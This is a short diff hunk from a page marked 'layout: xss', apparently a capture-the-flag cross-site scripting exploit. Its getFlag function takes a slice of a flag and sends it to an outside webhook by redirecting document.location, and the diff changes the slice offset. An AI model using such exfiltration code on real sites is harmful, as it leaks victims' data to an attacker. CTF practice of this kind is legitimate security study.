@@ -24,7 +24,7 @@ layout: xss
     }
 
     function getFlag(webhook, flag) {
-        flag = flag.substr(500);
+        flag = flag.substr(1000);
         payload = JSON.stringify(flag);
         /*fetch(webhook + payload).then(res => console.log("DONE", res));*/
         document.location = webhook + payload;
